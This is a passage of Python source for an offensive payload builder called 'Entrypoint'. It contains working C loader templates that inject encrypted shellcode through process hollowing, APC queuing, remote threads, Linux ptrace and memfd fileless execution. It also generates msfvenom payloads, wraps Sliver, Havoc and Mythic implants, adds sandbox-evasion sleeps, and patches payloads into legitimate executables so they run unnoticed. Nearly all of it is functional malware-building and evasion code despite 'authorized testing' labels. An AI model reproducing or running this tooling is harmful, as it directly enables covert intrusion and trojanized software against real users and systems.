    WriteProcessMemory(pi.hProcess, img, sc, len, NULL);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)(ULONG_PTR)img;
#else
    ctx.Eax = (DWORD)(ULONG_PTR)img;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return 1;
}'''

WIN_ROUTE_FUNCS = {
    "CurrentThread": "pf_current_thread",
    "Remote Process": "pf_remote",
    "Process Hollowing": "pf_hollow",
    "APC Injection": "pf_apc",
}

WIN_ROUTE_APC = r'''static int pf_apc(unsigned char *sc, unsigned int len) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    void *r;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!    CreateProcessA("notepad.exe", NULL, NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
    if (!r) return 0;
    WriteProcessMemory(pi.hProcess, r, sc, len, NULL);
    QueueUserAPC((PAPCFUNC)r, pi.hThread, 0);
    ResumeThread(pi.hThread);
    return 1;
}'''

WIN_RUNPE = r'''static int pf_drop_temp(const unsigned char *data, unsigned int len, char *out, DWORD outsz) {
    char tmp[MAX_PATH]; HANDLE h; DWORD w;
    GetTempPathA(MAX_PATH, tmp);
    wsprintfA(out, "%s%08x.exe", tmp, GetTickCount() ^ GetCurrentProcessId());
    h = CreateFileA(out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    if (!WriteFile(h, data, len, &w, NULL)) { CloseHandle(h); return 0; }
    CloseHandle(h);
    return 1;
}

/* T1055.002 — run inside a host PE you supply (e.g. putty.exe). The host is
 * spawned SUSPENDED, the shellcode is written into an RWX page in the child,
 * the host's main thread is resumed so the real program runs normally, and
 * the payload is fired on a second thread via CreateRemoteThread. Result:
 * the genuine app opens and behaves as itself while the payload executes
 * beside it under the host's process identity, name and token. */
static int pf_run_pe(const unsigned char *sc, unsigned int sclen) {
    char path[MAX_PATH];
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    LPVOID r; HANDLE t;
    if (!pf_drop_temp(PF_PE, PF_PE_LEN, path, MAX_PATH)) return 0;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) return 0;
    r = VirtualAllocEx(pi.hProcess, NULL, sclen,
                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!r) { TerminateProcess(pi.hProcess, 1); goto fail; }
    if (!WriteProcessMemory(pi.hProcess, r, sc, sclen, NULL)) {
        TerminateProcess(pi.hProcess, 1); goto fail;
    }
    ResumeThread(pi.hThread);          /* host runs normally from its entry */
    t = CreateRemoteThread(pi.hProcess, NULL, 0,
                           (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
    if (t) CloseHandle(t);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
fail:
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}'''

MAC_TEMPLATE = r'''/* Entrypoint generated loader — build @@BUILDID@@
 * Target: macOS   Route: in-memory mmap exec (PROT_READ|PROT_EXEC)
 * AUTHORIZED TESTING ONLY
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@

@@SLEEPCODE@@

@@DECRYPTCODE@@

int main(void) {
    unsigned char *buf;
    pf_sleep();
    buf = mmap(NULL, PF_BLOB_LEN, PROT_READ | PROT_WRITE,
               MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
    mprotect(buf, PF_BLOB_LEN, PROT_READ | PROT_EXEC);
    ((void(*)(void))buf)();
    return 0;
}
'''

POSIX_SLEEP = r'''static void pf_sleep(void) {
    unsigned int ms = @@SLEEPMS@@;
    srand((unsigned)time(NULL));
    ms = ms - ms * 35 / 100 + (unsigned int)(rand() % (int)(ms * 70 / 100 + 1));
    usleep(ms * 1000U);
}'''

MAC_XOR = WIN_XOR
MAC_RC4 = WIN_RC4

WIN_NOCRYPT = "static void pf_decrypt(unsigned char *buf, unsigned int len) { (void)buf; (void)len; }"
MAC_NOCRYPT = WIN_NOCRYPT
LIN_NOCRYPT = WIN_NOCRYPT

LIN_XOR = WIN_XOR
LIN_RC4 = WIN_RC4

LIN_AES = r'''#include <openssl/evp.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    EVP_CIPHER_CTX *c; unsigned char iv[16]; int outl = 0;
    c = EVP_CIPHER_CTX_new();
    if (!c) return;
    memcpy(iv, PF_IV, 16);
    EVP_DecryptInit_ex(c, EVP_aes_128_ctr(), NULL, PF_KEY, iv);
    EVP_DecryptUpdate(c, buf, &outl, buf, (int)len);
    EVP_CIPHER_CTX_free(c);
}'''

MAC_AES = r'''#include <CommonCrypto/CommonCryptor.h>
static void pf_decrypt(unsigned char *buf, unsigned int len) {
    CCryptorRef c; size_t moved;
    if (CCryptorCreateWithMode(kCCDecrypt, kCCModeCTR, kCCAlgorithmAES128,
                               ccNoPadding, PF_IV, PF_KEY, kCCKeySizeAES128,
                               NULL, 0, 0, NULL, &c) != kCCSuccess) return;
    CCryptorUpdate(c, buf, len, buf, len, &moved);
    CCryptorRelease(c);
}'''

LIN_COMMON_HEAD = r'''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
@@EXTRAINC@@
@@KEYDECL@@
@@IVDECL@@
@@BLOBDECL@@

@@SLEEPCODE@@

@@DECRYPTCODE@@
'''

LIN_SC_MAIN = r'''
int main(void) {
    unsigned char *buf;
    buf = mmap(NULL, PF_BLOB_LEN, PROT_READ | PROT_WRITE,
               MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return 1;
    memcpy(buf, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(buf, PF_BLOB_LEN);
    pf_sleep();
    mprotect(buf, PF_BLOB_LEN, PROT_READ | PROT_EXEC);
    ((void(*)(void))buf)();
    return 0;
}
'''

LIN_MEMFD_MAIN = r'''
/* Fileless execution: memfd_create + execveat(AT_EMPTY_PATH) — the decrypted
 * ELF never touches disk (obfuscated payload, T1027). */
int main(void) {
    unsigned char *blob; char *argv[2]; int fd; ssize_t off = 0, w;
    extern char **environ;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    fd = (int)syscall(SYS_memfd_create, "pf", 0);
    if (fd < 0) return 1;
    while (off < (ssize_t)PF_BLOB_LEN &&
           (w = write(fd, blob + off, PF_BLOB_LEN - off)) > 0) off += w;
    argv[0] = "@@DECOYNAME@@"; argv[1] = NULL;
    syscall(SYS_execveat, fd, "", argv, environ, 0x1000 /* AT_EMPTY_PATH */);
    return 1;
}
'''

LIN_SO_MAIN = r'''
/* Shared-library implant loaded filelessly from a memfd via
 * dlopen("/proc/self/fd/N") — the .so never touches disk. */
int main(void) {
    unsigned char *blob; char fdpath[64]; int fd; ssize_t off = 0, w; void *h;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    fd = (int)syscall(SYS_memfd_create, "pf", 0);
    if (fd < 0) return 1;
    while (off < (ssize_t)PF_BLOB_LEN &&
           (w = write(fd, blob + off, PF_BLOB_LEN - off)) > 0) off += w;
    snprintf(fdpath, sizeof fdpath, "/proc/self/fd/%d", fd);
    h = dlopen(fdpath, RTLD_NOW);
    if (!h) return 1;
    while (1) sleep(3600);   /* implant runs on its own threads once loaded */
    return 0;
}
'''

LIN_PTRACE_MAIN = r'''
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
/* T1055.008 — ptrace injection: fork a decoy, follow it into exec, poke the
 * payload over the text page at the post-exec instruction pointer (ptrace
 * bypasses W^X for traced children) and continue. */
static void pf_inject(unsigned char *sc, unsigned int len) {
    pid_t child; int status; unsigned int i; struct user_regs_struct regs;
    union { long v; unsigned char b[sizeof(long)]; } u;
    child = fork();
    if (child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        raise(SIGSTOP);
        execl("@@DECOYPATH@@", "@@DECOYPATH@@", (char *)NULL);
        _exit(1);
    }
    waitpid(child, &status, 0);            /* stopped before exec */
    ptrace(PTRACE_CONT, child, NULL, NULL);
    waitpid(child, &status, 0);            /* exec SIGTRAP */
    if (!WIFSTOPPED(status)) return;
    ptrace(PTRACE_GETREGS, child, NULL, &regs);
    for (i = 0; i < len; i += sizeof(long)) {
        size_t n = (len - i < sizeof(long)) ? (len - i) : sizeof(long);
        memset(u.b, 0x90, sizeof(u.b));
        memcpy(u.b, sc + i, n);
        ptrace(PTRACE_POKEDATA, child, (void *)(regs.rip + i), (void *)u.v);
    }
    ptrace(PTRACE_CONT, child, NULL, NULL);
    waitpid(child, &status, 0);
}

int main(void) {
    unsigned char *blob;
    blob = malloc(PF_BLOB_LEN);
    if (!blob) return 1;
    memcpy(blob, PF_BLOB, PF_BLOB_LEN);
    pf_decrypt(blob, PF_BLOB_LEN);
    pf_sleep();
    pf_inject(blob, PF_BLOB_LEN);
    return 0;
}
'''

IMPLANT_KIND = {
    "Sliver (raw shellcode)": "shellcode",
    "Sliver (shared-lib .so)": "so",
    "Sliver (service exe)": "exe",
    "Havoc (raw shellcode)": "shellcode",
    "Havoc (demon exe)": "exe",
    "Mythic (Athena agent)": "exe",
    "Mythic (Apollo agent)": "exe",
    "Mettle (POSIX meterpreter)": "exe",
}


def platform_of(payload: str) -> str:
    p = payload.strip().lower()
    if p.startswith("windows/"):
        return "Windows"
    if p.startswith("linux/"):
        return "Linux"
    if p.startswith("osx/") or p.startswith("macos/"):
        return "macOS"
    return "Linux"


KIND_OF_EXT = {
    ".bin": "shellcode", ".raw": "shellcode", ".c": "shellcode",
    ".hex": "shellcode", ".txt": "shellcode", ".ps1": "shellcode",
    ".so": "so", ".exe": "exe", ".elf": "exe", ".macho": "exe",
    ".dll": "exe",
}


def kind_of_implant(path: str) -> str:
    return KIND_OF_EXT.get(os.path.splitext(path)[1].lower(), "shellcode")


def parse_shellcode_text(text: str) -> bytes:
    """Accepts: raw hex, C arrays (0xDE,0xAD..), \\x.. strings, base64."""
    t = text.strip()
    if not t:
        return b""
    hexch = re.sub(r"0x", "", t, flags=re.I)
    hexch = re.sub(r"[^0-9a-fA-F]", "", hexch)
    if len(hexch) >= 8 and len(hexch) % 2 == 0:
        try:
            b = bytes.fromhex(hexch)
            if b:
                return b
        except ValueError:
            pass
    try:
        b = base64.b64decode(t, validate=True)
        if b:
            return b
    except Exception:
        pass
    return t.encode("utf-8", "ignore")


def safe_name(s: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", s)[:48] or "build"


def guess_shellcode_arch(sc: bytes) -> str | None:
    """Heuristic arch sniff of position-independent shellcode. Returns
    "x64", "x86" or None when unsure (never a hard error — the operator
    decides; the point is catching the obvious wrong-arch pairing).

    x64 tells: 48 8B.. mov r64, r64/r64,rm64 · 48 83 EC.. sub rsp, imm8 ·
    48 31 .. xor r64, r64 · 4C 8D.. lea r8 · 65 48 A1 movabs rax, gs:[..]
    x86 tells: 64 A1     mov eax, dword fs:[imm32] · 8B 4x/5x mov r32, r/m32
    (a bare `8B 5x` could be 32-bit-modrm under x64 too, hence it only
    contributes when no x64 tell fires and the count leads x64 tells)."""
    if not sc or len(sc) < 16:
        return None
    x64 = 0
    x86 = 0
    i = 0
    n = len(sc)
    while i < n - 1:
        b0 = sc[i]
        b1 = sc[i + 1]
        if b0 == 0x48 and 0x88 <= b1 <= 0x8B:          # mov r64, r64/rm64
            x64 += 1
        elif b0 == 0x48 and b1 == 0x83 and i + 3 < n and sc[i + 2] in (0xEC, 0xE4, 0xC4):
            x64 += 1                                    # sub/add rsp, imm8
        elif b0 == 0x48 and b1 in (0x31, 0x33, 0x29, 0x2B):   # xor/sub r64
            x64 += 1
        elif b0 == 0x4C and b1 == 0x8D:                 # lea r8, [..]
            x64 += 1
        elif b0 == 0x65 and b1 == 0x48 and i + 2 < n and sc[i + 2] in (0xA1, 0x8B):
            x64 += 2                                    # gs:[..] + REX.W — near-certain
        elif b0 == 0x64 and b1 == 0xA1:                 # mov eax, dword fs:[moffs32]
            x86 += 2                                    # x86 PEB access — near-certain
        elif b0 == 0x8B and 0x40 <= b1 <= 0x57:         # mov r32, r/m32
            x86 += 1
        i += 1
    if x64 >= 2 and x64 > x86:
        return "x64"
    if x86 >= 2 and x86 > x64:
        return "x86"
    return None


# ---------------------------------------------------------------------------
# The Entrypoint engine
# ---------------------------------------------------------------------------

class EntrypointError(Exception):
    pass


def decrypt_pair(blob: bytes, key: bytes = b"", iv: bytes = b"") -> bytes:
    """Decrypt a MAGIC-prefixed blob produced by Entrypoint.encrypt()."""
    if blob[:4] != MAGIC:
        raise EntrypointError("bad blob magic")
    enc_id = blob[4]
    body = blob[5:]
    if enc_id == 0:
        return body
    if enc_id == 1:
        return xor_crypt(body, key)
    if enc_id == 2:
        return rc4_crypt(body, key)
    if enc_id == 3:
        if not shutil.which("openssl"):
            raise EntrypointError("AES round-trip needs openssl on PATH")
        p = subprocess.run(["openssl", "enc", "-d", "-aes-128-ctr", "-nopad",
                            "-K", key.hex(), "-iv", iv.hex()],
                           input=body, capture_output=True)
        if p.returncode != 0:
            raise EntrypointError("openssl decrypt failed")
        return p.stdout
    raise EntrypointError(f"unknown enc_id {enc_id}")


class Entrypoint:
    """Resolves payload bytes (msfvenom or implant file), encrypts, emits
    loader sources + build.sh, and optionally compiles."""

    def __init__(self, log=None):
        self.log = log or (lambda msg: None)

    # -- payload resolution -------------------------------------------------

    def run_msfvenom(self, cfg, outdir) -> bytes:
        exe = shutil.which("msfvenom")
        if not exe:
            raise EntrypointError("msfvenom not found on PATH (Kali: `sudo apt install metasploit-framework`)")
        fmt = cfg.get("fmt") or "raw"
        out = os.path.join(outdir, "payload." + safe_name(fmt))
        # strip the GUI's [staged]/[stageless] annotation — msfvenom wants the bare name
        payload_name = cfg["payload"].split(" [")[0].strip()
        cmd = [exe, "-p", payload_name, "-f", fmt, "-o", out]
        if cfg.get("lhost"):
            cmd += [f"LHOST={cfg['lhost']}"]
        if cfg.get("lport"):
            cmd += [f"LPORT={cfg['lport']}"]
        if cfg.get("extra"):
            cmd += cfg["extra"].split()
        if cfg.get("pe_inject"):
            # the payload must not take the host process down when its session ends
            cmd += ["EXITFUNC=thread"]
            self.log("[*] EXITFUNC=thread (PE injection: host process survives session exit)")
        self.log(f"[*] Building MSFvenom payload...")
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        if p.returncode != 0 or not os.path.exists(out):
            tail = (p.stderr or p.stdout or "")[-400:]
            raise EntrypointError(f"msfvenom failed: {tail}")
        data = open(out, "rb").read()
        self.log(f"[+] Success! MSFvenom payload size: {len(data)} bytes")
        return data

    def read_implant(self, cfg) -> bytes:
        path = cfg.get("implant_path", "").strip()
        if not path or not os.path.exists(path):
            raise EntrypointError(f"implant file not found: {path or '(none given)'}")
        data = open(path, "rb").read()
        if not data:
            raise EntrypointError("implant file is empty")
        self.log(f"[*] Reading Payload... {os.path.basename(path)} ({len(data)} bytes, kind={kind_of_implant(path)})")
        if kind_of_implant(path) == "shellcode" and path.lower().endswith((".c", ".hex", ".txt", ".ps1")):
            data = parse_shellcode_text(data.decode("utf-8", "ignore"))
            self.log(f"[+] Parsed shellcode text -> {len(data)} bytes")
        return data

    # -- crypto -------------------------------------------------------------

    def encrypt(self, data: bytes, enc: str):
        """Returns (blob, key, iv, enc_id)."""
        if enc == "XOR Dynamic":
            key = rnd_bytes(16)
            return MAGIC + bytes([1]) + xor_crypt(data, key), key, b"", 1
        if enc == "RC4":
            key = rnd_bytes(16)
            return MAGIC + bytes([2]) + rc4_crypt(data, key), key, b"", 2
        if enc == "AES-CTR (seeded)":
            if not shutil.which("openssl"):
                raise EntrypointError("AES-CTR needs the openssl CLI (Kali ships it: sudo apt install openssl)")
            key = rnd_bytes(16)
            iv = rnd_bytes(16)
            p = subprocess.run(["openssl", "enc", "-aes-128-ctr", "-nopad",
                                "-K", key.hex(), "-iv", iv.hex()],
                               input=data, capture_output=True)
            if p.returncode != 0:
                raise EntrypointError("openssl AES-CTR failed: " + p.stderr.decode()[:200])
            return MAGIC + bytes([3]) + p.stdout, key, iv, 3
        return MAGIC + bytes([0]) + data, b"", b"", 0

    def decrypt(self, blob: bytes, key: bytes = b"", iv: bytes = b"") -> bytes:
        """Inverse of encrypt() — used by the selftest round-trip."""
        return decrypt_pair(blob, key, iv)

    # -- emission -----------------------------------------------------------

    def decls(self, key: bytes, iv: bytes, blob: bytes, pe: bytes = b"") -> str:
        s = ""
        if key:
            s += c_array(key, "PF_KEY") + f"\n#define PF_KEY_LEN {len(key)}\n"
        if iv:
            s += c_array(iv, "PF_IV") + "\n"
        s += c_array(blob, "PF_BLOB") + f"\n#define PF_BLOB_LEN {len(blob)}\n"
        if pe:
            s += c_array(pe, "PF_PE") + f"\n#define PF_PE_LEN {len(pe)}\n"
        return s

    def build(self, cfg, shellcode: bytes, pe_bytes: bytes = b"") -> str:
        """Emit the loader for cfg. Returns the output directory."""
        target = cfg["target"]
        buildid = "EP-" + rnd_hex(3).upper()
        outdir = os.path.join(OUT_DIR, f"{safe_name(buildid)}-{safe_name(target)}")
        os.makedirs(outdir, exist_ok=True)

        blob, key, iv, enc_id = self.encrypt(shellcode, cfg["enc"])
        self.log(f"[*] Encrypting with {cfg['enc']}" +
                 (f" (key {key.hex()[:12]}...)" if key else ""))

        kind = cfg.get("kind", "shellcode")
        injection = cfg.get("injection", "None")
        pe_on = bool(cfg.get("pe_inject") and pe_bytes)
        sleepms = 45000 if cfg["evasion"] != "None" else 0

        keydecl = ""   # all declarations are emitted inside blobdecl via decls()
        ivdecl = ""
        cipher = blob[5:]          # strip the PFGE tooling header — loader gets pure ciphertext
        blobdecl = self.decls(key, iv, cipher, pe_bytes if pe_on else b"")

        if target == "Windows":
            if kind != "shellcode":
                self.log("[!] Windows target with a compiled implant — ship it raw, or "
                         "use PE injection with a benign host exe instead of wrapping.")
            route_note = injection
            tmpl = (WIN_TEMPLATE
                    .replace("@@EXTRAINC@@", "#include <bcrypt.h>" if enc_id == 3 else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@PEDECL@@", "")
                    .replace("@@SLEEPCODE@@", WIN_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             WIN_AES if enc_id == 3 else WIN_RC4 if enc_id == 2 else WIN_XOR if enc_id == 1 else WIN_NOCRYPT)
                    .replace("@@EXECROUTE@@", {
                        "CurrentThread": WIN_ROUTE_CURRENT,
                        "Remote Process": WIN_ROUTE_REMOTE,
                        "Process Hollowing": WIN_ROUTE_HOLLOW,
                        "APC Injection": WIN_ROUTE_APC,
                    }.get(injection, WIN_ROUTE_CURRENT))
                    .replace("@@PEINJCODE@@", WIN_RUNPE if pe_on else "")
                    .replace("@@PEDECL@@", "")
                    .replace("@@DISPATCH@@",
                             ("static int pf_dispatch(unsigned char *sc, unsigned int len) {\n"
                              "    return pf_run_pe(sc, len);\n}") if pe_on else
                             ("static int pf_dispatch(unsigned char *sc, unsigned int len) {\n"
                              f"    return {WIN_ROUTE_FUNCS.get(injection, 'pf_current_thread')}(sc, len);\n}}"))
                    .replace("@@MAINCALL@@", "    pf_dispatch(buf, PF_BLOB_LEN);")
                    .replace("@@ROUTENOTE@@", route_note)
                    .replace("@@BUILDID@@", buildid))
            tmpl = tmpl.replace("@@SLEEPMS@@", str(sleepms))
            src_path = os.path.join(outdir, "loader.c")
            open(src_path, "w").write(tmpl)
            buildsh = self.win_buildsh(cfg, outdir)
            note = ""
            if injection.startswith("CurrentThread"):
                note = MITRE_NOTES["CurrentThread"]
            elif injection.startswith("Remote"):
                note = MITRE_NOTES["Remote Process"]
            elif injection.startswith("Process"):
                note = MITRE_NOTES["Process Hollowing"]
            elif injection.startswith("APC"):
                note = MITRE_NOTES["APC Injection"]
            self.log(f"[*] Emitting Windows loader ({injection}" + (" + T1055.002 PE injection" if pe_on else "") + ")")
            if note:
                self.log(f"[i] {note}")
            if pe_on:
                self.log(f"[i] {PE_INJ_NOTE}")

        elif target == "macOS":
            tmpl = (MAC_TEMPLATE
                    .replace("@@EXTRAINC@@", "#include <CommonCrypto/CommonCryptor.h>" if enc_id == 3 else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@SLEEPCODE@@", POSIX_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             MAC_AES if enc_id == 3 else MAC_RC4 if enc_id == 2 else MAC_XOR if enc_id == 1 else MAC_NOCRYPT)
                    .replace("@@BUILDID@@", buildid)
                    .replace("@@SLEEPMS@@", str(sleepms)))
            open(os.path.join(outdir, "loader.c"), "w").write(tmpl)
            buildsh = self.mac_buildsh(cfg, outdir)
            self.log("[*] Emitting macOS mmap-exec loader (PROT_READ|PROT_EXEC)")

        else:  # Linux
            head = (LIN_COMMON_HEAD
                    .replace("@@EXTRAINC@@", "#include <dlfcn.h>" if kind == "so" else "")
                    .replace("@@KEYDECL@@", "")
                    .replace("@@IVDECL@@", "")
                    .replace("@@BLOBDECL@@", blobdecl)
                    .replace("@@SLEEPCODE@@", POSIX_SLEEP if sleepms else "static void pf_sleep(void) {}")
                    .replace("@@DECRYPTCODE@@",
                             LIN_AES if enc_id == 3 else LIN_RC4 if enc_id == 2 else LIN_XOR if enc_id == 1 else LIN_NOCRYPT)
                    .replace("@@BUILDID@@", buildid))
            if kind == "so":
                body = LIN_SO_MAIN
            elif kind == "exe":
                body = LIN_MEMFD_MAIN.replace("@@DECOYNAME@@", cfg.get("decoy", "systemd-worker"))
            elif injection != "None":
                body = LIN_PTRACE_MAIN.replace("@@DECOYPATH@@", "/usr/bin/sleep")
                self.log("[*] Emitting Linux ptrace injector (T1055.008)")
            else:
                body = LIN_SC_MAIN
            src = (head + body).replace("@@SLEEPMS@@", str(sleepms))
            open(os.path.join(outdir, "loader.c"), "w").write(src)
            buildsh = self.lin_buildsh(cfg, outdir)
            self.log("[*] Emitting Linux loader (" +
                     ("memfd fileless exec" if kind == "exe" else
                      "memfd dlopen" if kind == "so" else
                      "ptrace injection" if injection != "None" else "mmap exec") + ")")

        bsh = os.path.join(outdir, "build.sh")
        open(bsh, "w").write(buildsh)
        os.chmod(bsh, 0o755)

        meta = {
            "build": buildid, "target": target, "payload": cfg.get("payload", ""),
            "implant": cfg.get("implant_path", ""), "kind": kind,
            "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
            "enc": cfg["enc"], "evasion": cfg["evasion"], "injection": injection,
            "pe_inject": pe_on, "x64": bool(cfg.get("x64", True)),
            "shellcode_len": len(shellcode), "blob_len": len(cipher),
            "enc_id": enc_id,
            "key_hex": key.hex(), "iv_hex": iv.hex(),
            "mitre": [m for m in [
                "T1055" if injection.startswith(("Remote", "Current")) else None,
                "T1055.012" if injection.startswith("Process") else None,
                "T1055.004" if injection.startswith("APC") else None,
                "T1055.008" if target == "Linux" and injection != "None" else None,
                "T1055.002" if pe_on else None,
                "T1027" if enc_id else None,
                "T1497.003" if cfg["evasion"] != "None" else None,
            ] if m],
        }
        open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))

        self.try_compile(cfg, outdir)
        self.log(f"[+] Done: {outdir}")
        return outdir

    def try_compile(self, cfg, outdir):
        src = os.path.join(outdir, "loader.c")
        target = cfg["target"]
        if target == "Windows":
            cc = shutil.which("x86_64-w64-mingw32-gcc") if cfg.get("x64", True) else shutil.which("i686-w64-mingw32-gcc")
            if not cc:
                self.log("[!] MinGW-w64 not found — run build.sh after: sudo apt install gcc-mingw-w64")
                return
            libs = "-lbcrypt" if cfg["enc"] == "AES-CTR (seeded)" else ""
            exe = os.path.join(outdir, "payload.exe")
            p = subprocess.run([cc, "-O2", src, "-o", exe] + libs.split(), capture_output=True, text=True)
            if p.returncode == 0:
                self.log(f"[+] Compiled {exe}")
            else:
                self.log("[!] mingw compile failed: " + (p.stderr or "")[-300:])
        elif target == "Linux":
            cc = shutil.which("gcc") or shutil.which("cc")
            if not cc:
                self.log("[!] gcc not found — run ./build.sh after installing build-essential")
                return
            exe = os.path.join(outdir, "payload.elf")
            libs = "-ldl" if cfg.get("kind") == "so" else ""
            p = subprocess.run([cc, "-O2", src, "-o", exe] + libs.split(), capture_output=True, text=True)
            if p.returncode == 0:
                self.log(f"[+] Compiled {exe}")
            else:
                self.log("[!] gcc compile failed: " + (p.stderr or "")[-300:])
        else:
            self.log("[!] macOS Mach-O can't be built from Linux — run build.sh on a mac (clang) or with osxcross")

    def embed_into_pe(self, cfg, shellcode: bytes, host: bytes) -> str:
        """T1055.002 file embedding — the deliverable IS the host
        executable. Appends a .entp section holding the encrypted shellcode and
        an architecture-matched (x64/x86) entry stub: the stub decrypts the
        stage, fires it on a second thread via CreateThread, then jumps to the
        original entry point, so the host program opens and runs completely
        normally. No separate loader, no spawned process — one file in, one
        file out."""
        buildid = "EP-" + rnd_hex(3).upper()
        outdir = os.path.join(OUT_DIR, f"{safe_name(buildid)}-PEEmbed")
        os.makedirs(outdir, exist_ok=True)

        enc = "XOR Dynamic"
        if cfg.get("enc", enc) != enc:
            self.log(f"[!] PE embedding uses in-stub XOR (stronger ciphers need a full "
                     f"loader) — building with XOR Dynamic instead of {cfg.get('enc')}")
        machine_rva = struct.unpack_from("<I", host, 0x3C)[0]
        host_arch = ("x64" if struct.unpack_from("<H", host, machine_rva + 4)[0]
                     == 0x8664 else "x86")
        stub_variant = secrets.randbelow(STUB_VARIANT_COUNT[host_arch])
        gate_spec = gates_spec_from_cfg(cfg)
        gate_bytes = (build_gate_prologue(gate_spec, host_arch)
                      if gate_spec else b"")
        if gate_spec:
            self.log("[*] Execution gates: %s"
                     % ", ".join(g["kind"] + ":" + g.get("needle", "")
                                 for g in gate_spec))
        key = rnd_bytes(16)
        self.log(f"[*] Encrypting with XOR Dynamic (key {key.hex()[:12]}...)")
        self.log(f"[*] Patching payload into host PE (T1055.002 file embedding)")
        try:
            patched = patch_pe(host, shellcode, key, stub_variant,
                               stage_prefix=gate_bytes)
        except EntrypointError as e:
            self.log(f"[!] {e}")
            raise
        machine_rva = struct.unpack_from("<I", host, 0x3C)[0]
        host_arch = ("x64" if struct.unpack_from("<H", host, machine_rva + 4)[0]
                     == 0x8664 else "x86")
        sc_arch = guess_shellcode_arch(shellcode)
        if sc_arch is not None and sc_arch != host_arch:
            self.log(f"[!] ARCHITECTURE MISMATCH: {host_arch} host but the "
                     f"shellcode looks {sc_arch} — the .entp stub and the "
                     f"payload must match or the host will crash on start")
        elif sc_arch is not None:
            self.log(f"[i] shellcode arch: {sc_arch} (matches {host_arch} host)")
        else:
            self.log("[i] shellcode arch: unknown (x86/x64 tell density too low)")
        if host_arch == "x86":
            self.log("[i] x86 (32-bit) host: the shellcode must be 32-bit to match "
                     "(e.g. windows/shell_reverse_tcp, windows/meterpreter/reverse_tcp)")
        else:
            self.log("[i] x64 host: use 64-bit shellcode to match")
        host_name = cfg.get("pe_name") or "host"
        exe = os.path.join(outdir, host_name)
        open(exe, "wb").write(patched)

        meta = {
            "build": buildid, "target": "Windows", "mode": "pe-embed",
            "host": host_name, "host_arch": host_arch,
            "sc_arch": guess_shellcode_arch(shellcode) or "unknown",
            "payload": cfg.get("payload", ""),
            "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
            "enc": enc, "shellcode_len": len(shellcode),
            "patched_len": len(patched), "host_len": len(host),
            "mitre": ["T1055.002", "T1027"],
            "key_hex": key.hex(),
            "stub_variant": stub_variant,
            "gates": gate_spec or None,
            "split_delivery": bool(cfg.get("split_delivery")),
            "note": f"entry -> .entp stub ({host_arch}): decrypt, CreateThread(shellcode), jmp OEP",
        }
        open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))
        open(os.path.join(outdir, "shellcode.bin"), "wb").write(shellcode)
        if cfg.get("split_delivery"):
            split_key_deliver(outdir, log=self.log)

        self.log(f"[i] {PE_INJ_NOTE}")
        self.log(f"[+] Embedded build: {exe} ({len(patched)} bytes — was {len(host)})")
        self.log(f"[+] Done: {outdir}")
        return outdir

    # -- build.sh writers ----------------------------------------------------

    def win_buildsh(self, cfg, outdir) -> str:
        cc = "x86_64-w64-mingw32-gcc" if cfg.get("x64", True) else "i686-w64-mingw32-gcc"
        libs = "-lbcrypt" if cfg["enc"] == "AES-CTR (seeded)" else ""
        return ("#!/bin/sh\n# Entrypoint build script — AUTHORIZED TESTING ONLY\n"
